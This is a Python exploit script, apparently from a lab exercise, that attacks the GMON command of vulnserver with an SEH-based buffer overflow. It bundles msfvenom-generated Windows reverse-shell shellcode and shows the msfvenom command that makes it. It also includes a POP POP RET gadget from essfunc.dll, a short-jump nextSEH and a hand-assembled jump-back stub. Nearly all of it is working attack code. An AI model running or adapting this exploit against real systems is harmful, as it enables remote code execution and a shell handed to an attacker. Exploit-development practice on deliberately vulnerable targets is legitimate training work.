#!/usr/bin/python3 

import socket
import struct

host = '192.168.0.101'
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

#grab banner
banner = s.recv(1024).decode()
print("[*] Banner Grabbed")
print(banner)

#badchars = \x00

#exploit properties
command = b"GMON /.:/"
nop_slide= b"\x90"*8

#msfvenom -p windows/shell_reverse_tcp lhost=eth0 lport=18890 -f py -b '\x00' > shellcode.py
buf =  b""
buf += b"\xbb\xdd\x54\xea\xa2\xdb\xd7\xd9\x74\x24\xf4\x5a\x29"
buf += b"\xc9\xb1\x52\x83\xea\xfc\x31\x5a\x0e\x03\x87\x5a\x08"
buf += b"\x57\xcb\x8b\x4e\x98\x33\x4c\x2f\x10\xd6\x7d\x6f\x46"
buf += b"\x93\x2e\x5f\x0c\xf1\xc2\x14\x40\xe1\x51\x58\x4d\x06"
buf += b"\xd1\xd7\xab\x29\xe2\x44\x8f\x28\x60\x97\xdc\x8a\x59"
buf += b"\x58\x11\xcb\x9e\x85\xd8\x99\x77\xc1\x4f\x0d\xf3\x9f"
buf += b"\x53\xa6\x4f\x31\xd4\x5b\x07\x30\xf5\xca\x13\x6b\xd5"
buf += b"\xed\xf0\x07\x5c\xf5\x15\x2d\x16\x8e\xee\xd9\xa9\x46"
buf += b"\x3f\x21\x05\xa7\x8f\xd0\x57\xe0\x28\x0b\x22\x18\x4b"
buf += b"\xb6\x35\xdf\x31\x6c\xb3\xfb\x92\xe7\x63\x27\x22\x2b"
buf += b"\xf5\xac\x28\x80\x71\xea\x2c\x17\x55\x81\x49\x9c\x58"
buf += b"\x45\xd8\xe6\x7e\x41\x80\xbd\x1f\xd0\x6c\x13\x1f\x02"
buf += b"\xcf\xcc\x85\x49\xe2\x19\xb4\x10\x6b\xed\xf5\xaa\x6b"
buf += b"\x79\x8d\xd9\x59\x26\x25\x75\xd2\xaf\xe3\x82\x15\x9a"
buf += b"\x54\x1c\xe8\x25\xa5\x35\x2f\x71\xf5\x2d\x86\xfa\x9e"
buf += b"\xad\x27\x2f\x30\xfd\x87\x80\xf1\xad\x67\x71\x9a\xa7"
buf += b"\x67\xae\xba\xc8\xad\xc7\x51\x33\x26\x28\x0d\x3b\xc1"
buf += b"\xc0\x4c\x3b\x64\xdb\xd8\xdd\x1c\xcb\x8c\x76\x89\x72"
buf += b"\x95\x0c\x28\x7a\x03\x69\x6a\xf0\xa0\x8e\x25\xf1\xcd"
buf += b"\x9c\xd2\xf1\x9b\xfe\x75\x0d\x36\x96\x1a\x9c\xdd\x66"
buf += b"\x54\xbd\x49\x31\x31\x73\x80\xd7\xaf\x2a\x3a\xc5\x2d"
buf += b"\xaa\x05\x4d\xea\x0f\x8b\x4c\x7f\x2b\xaf\x5e\xb9\xb4"
buf += b"\xeb\x0a\x15\xe3\xa5\xe4\xd3\x5d\x04\x5e\x8a\x32\xce"
buf += b"\x36\x4b\x79\xd1\x40\x54\x54\xa7\xac\xe5\x01\xfe\xd3"
buf += b"\xca\xc5\xf6\xac\x36\x76\xf8\x67\xf3\x86\xb3\x25\x52"
buf += b"\x0f\x1a\xbc\xe6\x52\x9d\x6b\x24\x6b\x1e\x99\xd5\x88"
buf += b"\x3e\xe8\xd0\xd5\xf8\x01\xa9\x46\x6d\x25\x1e\x66\xa4"

padding = b"A"*(3519-4-len(buf)-len(nop_slide))
'''
assembly instruction
EB 09 jmp $+11
'''
nextSEH = b"\x90\x90\xEB\x09"

#0x625010b4 : pop ebx # pop ebp # ret  |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\Malwally\Desktop\vulnserver-master\essfunc.dll)
SEH = struct.pack("<I", 0x625010B4)
nopSlide = b"\x90"*8

'''
assembly instruction

nasm > push esp
00000000  54                push esp
nasm > pop eax
00000000  58                pop eax
nasm > add ax, 0x5b1
00000000  6605B105          add ax,0x5b1
nasm > jmp eax
00000000  FFE0              jmp eax
'''
jmpBack = b"\x54\x58\x66\x05\xb1\x05\xff\xe0"

junk = b"D"*(5000-(len(SEH) + len(nopSlide) + len(jmpBack) + len(nextSEH) + len(padding) + len(buf) + len(nop_slide) + len(command)))

payload = b"".join([
	command,
	nop_slide,
	buf,
	padding,
	nextSEH,
	SEH,
	nopSlide,
	jmpBack,
	junk
])

#send payload
print("[*] Sending Payload.") 
s.send(payload)
print("[*] Payload Send Successful.")
